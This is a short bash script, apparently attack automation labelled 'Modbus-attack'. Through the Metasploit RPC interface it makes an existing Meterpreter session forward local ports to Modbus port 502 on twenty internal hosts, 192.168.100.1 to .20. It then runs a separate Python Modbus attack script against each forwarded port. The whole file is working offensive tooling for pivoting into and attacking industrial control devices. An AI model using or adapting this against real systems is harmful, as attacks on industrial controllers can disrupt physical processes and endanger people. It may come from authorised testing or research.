#!/bin/bash 
REQFILE="ebsessiongood.var"

if [ ! -f $REQFILE ]
then
	echo "Requisite file not found, SKIP"
	exit 1
fi

FEAT="Modbus-attack"


for i in $(seq 1 20); do
	port=$((5000+i))

	msfrpc -a 127.0.0.1 -P letmein <<EOF
irb_context.echo = false
rpc.call('session.meterpreter_write', 1, "portfwd add -l $port -p 502 -r 192.168.100.$i")
exit
EOF

	python fwd_modbus_attack.py "P" --port $port -t 20
done

